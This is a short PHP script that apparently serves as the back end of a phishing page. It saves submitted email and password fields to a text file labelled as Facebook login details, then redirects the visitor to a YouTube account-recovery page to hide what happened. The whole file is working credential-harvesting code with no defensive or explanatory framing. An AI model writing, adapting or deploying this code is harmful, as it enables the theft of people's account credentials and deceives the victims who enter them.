<?php 
file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://youtube.com/recover/initiate/');
exit();
?>